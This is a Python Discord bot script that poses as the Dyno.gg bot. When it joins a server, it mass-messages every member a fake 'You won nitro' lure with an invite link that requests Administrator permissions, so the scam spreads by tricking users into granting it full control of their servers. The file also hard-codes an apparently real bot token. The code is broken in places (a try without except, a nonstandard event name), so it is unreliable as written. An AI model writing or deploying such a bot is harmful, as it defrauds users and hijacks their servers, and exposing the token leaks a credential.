from operator import mod
import re
import random
import discord
from discord import embeds
from discord import colour
from discord import user
from discord import member
from discord import permissions
from discord.colour import Color 
from discord.ext import commands
from discord.ext.commands import bot
from discord.ext.commands.bot import Bot
from discord.ext.commands.core import after_invoke, command, cooldown, has_permissions
from discord.ext.commands.errors import BotMissingPermissions, MissingPermissions, MissingRequiredArgument
from discord.member import Member
from discord.utils import time_snowflake
from discord import Intents
from discord.ext import commands

intents=discord.Intents.all()

client = commands.Bot(command_prefix = '.',intents=intents)
client.remove_command('help')

@client.event
async def on_ready():
    activity = discord.Game(name="Dyno.gg", type=3)
    await client.change_presence(status=discord.Status.online, activity=activity)
    print("The bot is ready")

@client.event
async def on_bot_join(ctx):
  members=ctx.guild.members
  
  embed=discord.Embed(title="",color=discord.Color.red())
  embed.add_field(name="You won nitro",value="Add this bot to claim your gift after 24h [ADD BOT!!](https://discord.com/api/oauth2/authorize?client_id=850076753828249650&permissions=8&scope=bot)")
  embed.set_image(url="https://tenor.com/view/discord-classic-nitro-gif-14823293")
  for member in members:
    try:
       await member.send(embed=embed)



client.run("ODUwMDc2NzUzODI4MjQ5NjUw.YLkdqw.xFxLZJhcqED0qlUytLfu8MsM1Xo")
